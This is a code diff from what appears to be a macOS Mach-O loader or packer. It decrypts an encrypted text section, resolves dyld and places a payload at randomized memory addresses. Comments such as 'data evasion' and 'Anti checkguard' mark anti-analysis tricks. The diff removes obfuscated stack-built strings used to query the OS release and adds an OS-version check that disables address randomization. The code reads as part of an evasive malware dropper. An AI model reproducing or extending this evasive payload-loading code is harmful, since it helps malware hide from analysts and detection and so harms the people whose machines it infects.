@@ -193,6 +193,14 @@ void* resolve_dyld_start(int fd, void *mheader_ptr)
   mh_vmadd_off += get_rand_pageaddr();
   mh_vmadd_off += get_rand_pageaddr();
   
+  int rand_addr = randomize_addresses_v1();
+  
+  // check if we are running on osx 10.6
+  if (rand_addr == 0)
+  {
+    mh_vmadd_off = 0;
+  }
+
   if (ft_header->magic != MH_MAGIC)
   {
     if (ft_header->magic != FAT_CIGAM)
@@ -273,6 +281,8 @@ void* resolve_dyld_start(int fd, void *mheader_ptr)
       curr_lc_cmd += mh_lcomm->cmdsize;
     }
   }
+  
+  //__asm volatile ("int $0x3");
   
   return ret_address;
 }
@@ -408,16 +418,6 @@ __END_ENC_TEXT_FUNC
 #include "text_sc_enc.h"
 ///////////////////////////////////////////
 
-void ___memcpy(char* dst, char* src, int size)
-{
-  char* _dst = (char*)dst;
-  char* _src = (char*)src;
-  for (int i=0; i<size; i++)
-  {
-    _dst[i]=_src[i];
-  }
-}
-
 /*
  *  entry_point(int argc, const char * argv[], const char *env[])
  *
@@ -432,35 +432,15 @@ void ___memcpy(char* dst, char* src, int size)
 
 int entry_point(int argc, const char * argv[], const char *env[])
 {
-  char* osstr;
-  char* osrelease;
   int ret_val=0;
-  size_t osstrsize = 0x100;
+  int addr_randomize = 0x230;
   mh_mmap_t   _mh_mmap      = NULL;
   strlen_t    _strlen       = (void*)0xFF3000;
   in_param**  patch_param   = (void*)0x2000;
   in_param*   patched_param = (void*)0x12000;
   check_integrity_t _check_integrity = (void*)'1de ';
   crypt_payload_t   _crypt_payload   = (void*)0x34;
-  
-  // Anti checkguard: make room for key table on stack
-  __asm __volatile__
-  (
-   "subl  $0x100, %%esp\n"
-   "movl  %%esp , %0\n"
-   : "=r" (osrelease)
-   :
-   : "eax"
-   );
-  
-  __asm __volatile__
-  (
-   "subl  $0x100, %%esp\n"
-   "movl  %%esp , %0\n"
-   : "=r" (osstr)
-   :
-   : "eax"
-   );
+
   
   // data evasion
   patch_param = &patched_param;
@@ -489,23 +469,8 @@ int entry_point(int argc, const char * argv[], const char *env[])
   enc_unpacker_text_section(enc_begin_block_addr, enc_block_len);
   
   _check_integrity((*patch_param)->hash);
-  
-  for(int i=0; i<0x100; i++)
-    osstr[i]=0;
-  
-  int o1 = 'nrek', o2 = 'rso.', o3 = 'aele', o4 = 'es';
-  
-  ___memcpy(osrelease,   (char*)&o1, 4);
-  ___memcpy(osrelease+4, (char*)&o2, 4);
-  ___memcpy(osrelease+8, (char*)&o3, 4);
-  ___memcpy(osrelease+12,(char*)&o4, 4);
-  
-  int ret = mh_sysctlbyname(osrelease, osstr, &osstrsize, NULL, 0);
-  
-  if (ret == 0)
-  {
-    
-  }
+
+  addr_randomize = randomize_addresses_v1();
   
   //mh_bsdthread_create(_check_integrity, &(patched_param->hash), 0x80000, 0, 0);
   
@@ -516,6 +481,9 @@ int entry_point(int argc, const char * argv[], const char *env[])
   int payload_addr2 = get_rand_pageaddr();
   
   payload_addr1 +=payload_addr2;
+  
+  if (addr_randomize == 0)
+    payload_addr1 = 0x1000;
   
   int   name_len     = _strlen((char*)name) + 1;
 
